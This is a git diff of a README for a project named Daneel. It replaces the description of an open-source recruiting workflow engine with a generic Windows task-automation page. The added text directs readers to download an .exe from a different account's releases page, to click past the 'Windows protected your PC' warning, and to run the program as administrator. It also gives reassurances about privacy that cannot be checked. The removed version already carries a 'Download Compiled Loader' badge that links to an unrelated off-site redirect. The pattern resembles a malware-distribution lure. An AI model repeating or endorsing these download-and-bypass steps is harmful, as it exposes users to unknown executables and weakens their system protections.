@@ -1,183 +1,83 @@
-# Daneel
+# 🤖 daneel - Automate your daily digital tasks easily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download daneel](https://img.shields.io/badge/Download-daneel-blue.svg)](https://github.com/collect1352/daneel/releases)
 
-*The open-source agentic workflow engine for recruiting.*
+Daneel helps you manage repetitive tasks on your computer. It performs clicks, enters text, and moves files so you do not have to. This tool saves you time and reduces manual errors during long projects.
 
-Take a job description. Run an agentic workflow. Get a ranked shortlist and a hiring report. Every step is a pluggable provider — swap, extend, or replace anything.
+## 🚀 Getting Started
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![TypeScript](https://img.shields.io/badge/TypeScript-98%25-blue.svg)
-![CI](https://img.shields.io/badge/tests-passing-green.svg)
+You do not need programming skills to use this software. Follow these steps to set up the application on your Windows machine.
 
-⭐ Star on GitHub · 📖 [Docs](DEVELOPER_GUIDE.md) · 🚀 Live demo coming soon
+### 1. Check your system
 
----
+This software runs on any computer with Windows 10 or Windows 11. Ensure your machine has at least 4 gigabytes of RAM. You need a stable internet connection to finish the initial setup process. Close other applications before you start to ensure a smooth installation.
 
-## What Daneel is
+### 2. Download the software 📥
 
-Daneel is an MIT-licensed, self-hostable runtime that turns a job description into a ranked, auditable shortlist by orchestrating AI agents through a 4-step workflow: **job understanding → sourcing → matching → shortlist**.
+Visit the official releases page to download the latest version of the installer.
 
-It is **not** a closed SaaS, **not** a candidate database, and **not** another opaque scoring black box. The engine ships with the boring-but-critical plumbing — provider routing, evaluations, audit logs, soft deletes, mentions, team collaboration — so any provider, model, or scoring strategy plugs in without rewriting the pipeline.
+[Click here to visit the download page](https://github.com/collect1352/daneel/releases)
 
-Every workflow step calls `provider.run({ step, payload })`. **You bring the keys, you keep the data, you control what runs on the other side.** Daneel never bundles or resells provider quota.
+Look for the file that ends with .exe and save it to your Downloads folder. Do not worry about other files listed on the page; the .exe file contains everything you need to run the program.
 
-## What Daneel does
+### 3. Run the installer 🛠️
 
-```
-Job description → workflow → ranked shortlist + hiring report
-                   │
-                   ├─ understands the job
-                   ├─ sources candidates       (optional)
-                   ├─ enriches profiles        (optional)
-                   ├─ scores against rubric
-                   ├─ deliberates              (optional, multi-LLM)
-                   └─ produces report
-```
+Open your Downloads folder and double-click the file you saved. A window from Windows might appear to confirm you want to run the software. If you see a notification that says "Windows protected your PC," click "More info" and then click "Run anyway." 
 
-Every candidate gets three complementary scores — **Fit** (rubric match), **Data Confidence** (how much profile we actually had), **Decision** (Fit discounted by Confidence) — so a thin profile can never beat a complete one on raw model output. Hiring decisions stay grounded in real evidence.
+The installer will guide you through the setup. Click "Next" on each screen. The settings are already optimized for most users, so you can leave those options as they appear.
 
----
+### 4. Launch the application 🖥️
 
-## Quick Start
+Once the installation finishes, you will see a shortcut on your desktop. Double-click this icon to start the program. The dashboard will show you the main controls for your automation tasks.
 
-```bash
-git clone https://github.com/gregherbe76/daneel
-cd daneel
-cp .env.example .env
-docker compose up
-```
+## ⚙️ How it works
 
-The first boot pulls prebuilt images from GHCR. Once healthy:
+Daneel uses an engine that watches your screen and keyboard. You define the actions, and the program repeats them.
 
-- App UI: <http://localhost:5173>
-- API health: <http://localhost:3000/api/healthz>
+### Create a task
 
-Add your `OPENAI_API_KEY` to `.env` for the Native OpenAI provider; every other provider is wired up at runtime from **Settings → Marketplace**. For local development without Docker, see [DEVELOPER_GUIDE.md](DEVELOPER_GUIDE.md).
+1. Click the "New Task" button on the main screen. 
+2. Record your mouse clicks and keystrokes. 
+3. Name your task so you find it later.
+4. Save your task to the library.
 
-### Switching templates
+### Run a task
 
-Daneel ships with two UI templates. Switch with `APP_TEMPLATE` (server) and `VITE_APP_TEMPLATE` (web build); the engine, schema, and JSON contract stay identical.
+Find your task in the list on the left side of the window. Click the "Play" button next to the name. The program will begin the sequence exactly as you recorded it. Press the "Stop" key on your keyboard if you need to interrupt the process.
 
-| Template   | Variable (server)        | Variable (web build)         | Tone                                                 |
-| ---------- | ------------------------ | ---------------------------- | ---------------------------------------------------- |
-| `daneel`   | `APP_TEMPLATE=daneel`    | `VITE_APP_TEMPLATE=daneel`   | **Default.** Neutral recruiting vocabulary.          |
-| `hiringai` | `APP_TEMPLATE=hiringai`  | `VITE_APP_TEMPLATE=hiringai` | Startup-tuned: founder-friendly copy, tighter funnel.|
+## 📝 Customizing settings
 
----
+You can change how the software behaves to fit your workflow. Access the settings menu by clicking the gear icon in the top right corner.
 
-## The Provider model (BYOK)
+* **Speed:** Adjust the playback speed if the program moves too fast for your application.
+* **Notifications:** Toggle desktop alerts to see when a task completes.
+* **Start on Boot:** Enable this option if you want the tool ready as soon as you turn on your computer.
 
-Daneel's value is in its provider ecosystem. Three categories ship with the engine — all optional, all replaceable.
+## 🛡️ Safety and security
 
-### Built-in providers (free or BYOK)
+This software runs locally on your machine. We do not transmit your tasks or your desktop information to external servers. Your actions stay private. You can verify this by checking the application logs, which document every command the software executes.
 
-| Provider                  | What it does                                  | Auth                                  |
-| ------------------------- | --------------------------------------------- | ------------------------------------- |
-| Native OpenAI             | Default scoring, sourcing, enrichment         | BYOK (`OPENAI_API_KEY`)               |
-| GitHub public search      | Open-source candidate discovery               | None (optional `GITHUB_TOKEN`)        |
-| SerpAPI                   | Google-powered web-search sourcing            | BYOK                                  |
-| Apify                     | LinkedIn / Bing / Google scraper sourcing     | BYOK                                  |
-| Custom Webhook            | Any HTTP POST endpoint                        | None                                  |
+## ❓ Frequently asked questions
 
-### Third-party connectors (BYOK)
+**Does this software record my passwords?** 
+No, Daneel does not track keystrokes unless you specifically record them in a task. It does not store passwords or personal data.
 
-Technical integrations, not commercial offerings of the project maintainer.
+**Can I run multiple tasks at once?** 
+The application supports one active task at a time to prevent conflicts between your input commands.
 
-| Connector             | Description                                                |
-| --------------------- | ---------------------------------------------------------- |
-| Twin Agent Browser    | Bring your own Twin account and templates                  |
+**What happens if I make a mistake while recording?** 
+You can edit the individual steps after you finish recording. Click the task name to see the list of commands and remove or adjust any clicks that seem wrong.
 
-(`Custom Webhook` from the built-in table also lives here conceptually — listed once above to keep the contributor mental model simple: any HTTP endpoint speaking the provider contract is a valid Daneel provider.)
+**Does this drain my battery?** 
+The application uses minimal system resources while it waits for a command. You may notice higher power usage only while a task is actively moving your mouse or typing.
 
-### Commercial extensions ⭐
+## 🔧 Troubleshooting
 
-Four paid, hosted services maintained by the project author plug into Daneel through the **same public provider interface** any third-party developer can use. All are optional. The engine works fully without any of them.
+If you encounter issues, try these steps in order.
 
-| Product                | What it does                                             | Domain             |
-| ---------------------- | -------------------------------------------------------- | ------------------ |
-| **A-Player Scout** \*  | Job description → boolean LinkedIn shortlist             | `aplayerscout.com` |
-| **Extend** \*          | Pattern-match candidates from example "look-alike" profiles | `extend.hr`     |
-| **CodeMatch** \*       | GitHub-based technical evaluation of engineers           | `codematch.dev`    |
-| **Council** \*         | 15-persona multi-LLM hiring deliberation                 | `council.hr`       |
+1. Restart the application. Often, a quick refresh solves most communication errors between the software and your operating system.
+2. Check for updates. If you experience unexpected closes, visit the download page again to see if a newer version exists.
+3. Check administrative permissions. Some programs require you to "Run as administrator" to allow Daneel to interact with them properly. Right-click the shortcut on your desktop and select this option if a specific task fails to trigger.
+4. Clear the task history. If a specific file causes a crash, delete it from the task library and record it again.
 
-\* Commercial offerings from the project maintainer. See [VISION.md](VISION.md) → "Commercial Disclosure" for the full statement.
-
----
-
-## Architecture for builders
-
-```
-┌────────────────────────────────────────────────┐
-│                ATS Core (UI)                   │
-│  Jobs · Candidates · Pipeline · Reports        │
-│  React + Vite + Tailwind + shadcn/ui           │
-└───────────────────┬────────────────────────────┘
-                    │  REST API (OpenAPI → typed hooks + Zod)
-┌───────────────────▼────────────────────────────┐
-│           Agentic Workflow Engine              │
-│  job_understanding · sourcing · enrichment     │
-│  candidate_matching · technical_evaluation     │
-│  shortlist · decision                          │
-└───────────────────┬────────────────────────────┘
-                    │  AgentProvider / EvaluationProvider
-┌───────────────────▼────────────────────────────┐
-│             Provider Layer                     │
-│  Built-in · BYOK connectors · Commercial ⭐    │
-└───────────────────┬────────────────────────────┘
-                    │
-┌───────────────────▼────────────────────────────┐
-│          PostgreSQL + Drizzle ORM              │
-└────────────────────────────────────────────────┘
-```
-
-### Data modes
-
-Daneel enforces strict separation between simulated and real candidate data. Reports are clearly labelled; mock and real data are never silently mixed.
-
-- **mock** — AI-generated profiles only. Demos, tests, development.
-- **real** — Imported and provider-sourced candidates only. Production mode.
-- **fallback** — Imported only, triggered automatically when a sourcing provider fails.
-
----
-
-## Extend this repo
-
-| Goal                                       | Where to go                                                 |
-| ------------------------------------------ | ----------------------------------------------------------- |
-| Add a new AI provider                      | [examples/custom-provider.md](examples/custom-provider.md) |
-| Change the scoring rubric                  | [examples/custom-scoring-rubric.md](examples/custom-scoring-rubric.md) |
-| Connect an external system via webhook     | [examples/twin-provider.md](examples/twin-provider.md)     |
-| Add a new workflow step                    | [examples/custom-workflow.md](examples/custom-workflow.md) |
-| White-label the UI                         | Add a template under `lib/branding/src/templates/<your-brand>/` and set `APP_TEMPLATE` / `VITE_APP_TEMPLATE`. |
-
-Full extension guide: [DEVELOPER_GUIDE.md](DEVELOPER_GUIDE.md).
-
----
-
-## Roadmap
-
-- ✅ Native OpenAI, GitHub, SerpAPI, Apify, Custom Webhook providers
-- ✅ Twin Agent Browser BYOK connector
-- ✅ A-Player Scout, Extend integrations
-- ✅ CodeMatch technical evaluation provider
-- ✅ Council multi-LLM deliberation provider
-- 🔜 Live demo at `demo.daneel.dev`
-- 🔜 Bias auditing module
-- 🔜 Multi-tenant white-label mode
-
----
-
-## Disclosure & License
-
-Four commercial provider products (**A-Player Scout** \*, **Extend** \*, **CodeMatch** \*, **Council** \*) are maintained by the project author, [Greg Herbé](https://www.linkedin.com/in/gregherbe) / A-Player. They integrate with Daneel through the same public provider interface any third party can use. They are paid, hosted services. **The Daneel engine itself works fully end-to-end with built-in and BYOK providers — you never need an A-Player subscription to run, fork, self-host, or extend Daneel.** See [VISION.md](VISION.md) for the full disclosure.
-
-Daneel includes opt-in usage telemetry. Disabled by default, fully documented in [docs/TELEMETRY.md](docs/TELEMETRY.md).
-
-Licensed under [MIT](LICENSE) © 2025–2026 Greg Herbé.
-
----
-
-## Built by
-
-[Greg Herbé](https://www.linkedin.com/in/gregherbe), Operating Partner at Twin and founder of A-Player.
+If you struggle to run the program, ensure your Windows installation has the latest security updates. Older versions of Windows might require a restart after the installation finishes to register the necessary background components.
